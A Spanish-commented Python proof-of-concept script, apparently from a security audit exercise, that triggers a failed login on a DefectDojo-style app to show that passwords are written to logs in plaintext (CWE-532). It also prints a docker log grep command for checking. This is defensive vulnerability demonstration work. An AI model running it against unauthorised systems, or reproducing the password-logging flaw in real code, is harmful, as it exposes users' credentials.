"""
A09:2025 — Vuln 1: Contraseña en texto plano en logs (CWE-532)

El handler log_user_login_failed en dojo/utils.py loguea la contraseña del
usuario cuando el login falla, exponiendo credenciales en los archivos de log.

Uso:
    python A09_V1.py --host http://<HOST> --user <USER> --password <PASS>
    python A09_V1.py --host http://<HOST> --user <USER> --password <PASS> --show-logs
"""

import argparse
import json
import re
import http.cookiejar
import urllib.error
import urllib.parse
import urllib.request


# ---------------------------------------------------------------------------
# Helpers HTTP
# ---------------------------------------------------------------------------

def _post_json(url: str, body: dict) -> tuple[int, bytes]:
    data = json.dumps(body).encode()
    req = urllib.request.Request(
        url, data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def _post_form_with_csrf(host: str, username: str, password: str) -> int:
    """Intenta login por el formulario web y devuelve el HTTP status."""
    login_url = f"{host.rstrip('/')}/login"
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

    # GET /login → csrfmiddlewaretoken
    req = urllib.request.Request(login_url, method="GET")
    try:
        with opener.open(req) as r:
            html = r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        html = e.read().decode(errors="replace")

    m = re.search(r'name="csrfmiddlewaretoken"\s+value="([^"]+)"', html)
    if not m:
        raise RuntimeError("No se encontró csrfmiddlewaretoken")
    csrf_token = m.group(1)

    body = urllib.parse.urlencode({
        "username": username,
        "password": password,
        "csrfmiddlewaretoken": csrf_token,
    }).encode()
    req = urllib.request.Request(
        login_url, data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": login_url},
        method="POST",
    )
    try:
        with opener.open(req) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code


# ---------------------------------------------------------------------------
# Exploit
# ---------------------------------------------------------------------------

def exploit(host: str, username: str, password: str) -> None:
    print("\n" + "=" * 60)
    print("VULN A09-1 — CWE-532: Contraseña en texto plano en logs")
    print("=" * 60)

    print(f"\n[*] Intentando login fallido con credenciales incorrectas...")
    print(f"    Usuario   : {username}")
    print(f"    Contraseña: {password}  ← se registrará en el log")

    # Intentar login con contraseña incorrecta deliberadamente
    bad_password = password + "_WRONG"
    status = _post_form_with_csrf(host, username, bad_password)
    print(f"\n[+] Login fallido recibido: HTTP {status} (esperado)")

    print(f"\n[*] La contraseña '{bad_password}' quedó registrada en el log del contenedor.")
    print(f"    Para verificar, ejecutar en el servidor:")
    print(f"    docker compose logs uwsgi 2>&1 | grep 'login failed for: {username}'")
    print(f"    Salida esperada:")
    print(f"    WARNING login failed for: {username} (password: {bad_password}) via ip: ...")
    print()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Exploit A09 Vuln 1 — CWE-532: Contraseña en logs"
    )
    parser.add_argument("--host", required=True, help="URL base, ej: http://host:8080")
    parser.add_argument("--user", required=True, help="Username a usar en el login fallido")
    parser.add_argument("--password", required=True, help="Contraseña (se enviará incorrecta para forzar el fallo)")
    args = parser.parse_args()

    exploit(args.host, args.user, args.password)
